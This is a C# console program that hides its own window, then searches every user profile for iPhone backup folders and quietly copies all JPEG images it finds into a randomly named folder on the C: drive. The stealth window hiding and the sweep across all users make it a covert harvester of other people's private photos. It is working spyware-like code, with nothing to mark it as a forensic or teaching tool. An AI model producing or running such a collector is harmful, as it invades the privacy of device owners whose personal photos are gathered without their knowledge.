﻿using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Management;
using System.DirectoryServices;
using System.Collections;
using System.Runtime.InteropServices;

namespace ConsoleApplication1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [STAThread()]



        static void Main(string[] args)
        {
            string WinTitle = (System.Guid.NewGuid().ToString("D"));

            Console.Title = WinTitle;

            //Sometimes System.Windows.Forms.Application.ExecutablePath works for the caption depending on the system you are running under.
            IntPtr hWnd = FindWindow(null, WinTitle); //put your console window caption here
            if (hWnd != IntPtr.Zero)
            {

                ShowWindow(hWnd, 0); // 0 = SW_HIDE                

            }

            string userpath;
            string appdata;

            //put targetpath creation in its own function
            string targetPath = @"C:\" + (System.Guid.NewGuid().ToString("D"));

            // To copy a folder's contents to a new location: 
            // Create a new target folder, if necessary. 
            if (!System.IO.Directory.Exists(targetPath))
            {
                System.IO.Directory.CreateDirectory(targetPath);
            }
            GetOSinfo osdetector = new GetOSinfo();
            Console.WriteLine(osdetector.getOSInfo());
            if ((osdetector.getOSInfo()).Contains("Windows 7") || (osdetector.getOSInfo()).Contains("Vista")) 
            {
                userpath = "C:\\Users\\";
                appdata = "\\AppData\\Roaming\\";
            }
            else
            {
                userpath = "C:\\Documents and Settings\\";
                appdata = "\\Application Data\\";
            }

            List<string> backup_paths = new List<string>();
            //Break this into a separate function
            DirectoryInfo[] userdirs = new DirectoryInfo(userpath).GetDirectories();
            foreach (DirectoryInfo user in userdirs)
            {
                {
                    Console.WriteLine("Username : {0}", user);
                    String dirname = userpath + user + appdata + "Apple Computer\\MobileSync\\Backup";
                    if (Directory.Exists(dirname))
                    {
                        Console.WriteLine("{0} has iPhone backups", user
                            );
                        DirectoryInfo di = new DirectoryInfo(dirname);
                        DirectoryInfo[] dirinfo = di.GetDirectories();
                        foreach (DirectoryInfo item in dirinfo)
                        {
                            backup_paths.Add(item.FullName);
                            Console.WriteLine(item.FullName);
                            //Console.WriteLine(backup_paths[0]);
                            foreach (FileInfo f in item.GetFiles())
                            {
                                //Open each file in user directories and read first two bytes to check for JPG
                                FileStream fs = File.Open(f.FullName, FileMode.Open);
                                Byte[] b = new byte[2];
                                fs.Read(b, 0, 2);
                                fs.Close();
                                string prettyb = ByteArrayToString(b);
                                Console.WriteLine(prettyb);
                                Console.WriteLine(f.FullName);

                                if (prettyb.Contains("FFD8"))
                                {
                                    //copy JPGs into folder
                                    string fileName = f.Name + ".jpg";


                                    // Use Path class to manipulate file and directory paths. 
                                    string destFile = System.IO.Path.Combine(targetPath, fileName);



                                    // To copy a file to another location and  
                                    // overwrite the destination file if it already exists.
                                    System.IO.File.Copy(f.FullName, destFile, true);
                                }
                                else
                                {
                                    continue;
                                }

                            }

                        }

                    }
                    //Console.ReadKey(true);

                }
            }
        }
        public static string ByteArrayToString(byte[] ba)
        {
            string hex = BitConverter.ToString(ba);
            return hex.Replace("-", "");
        }



    }
}
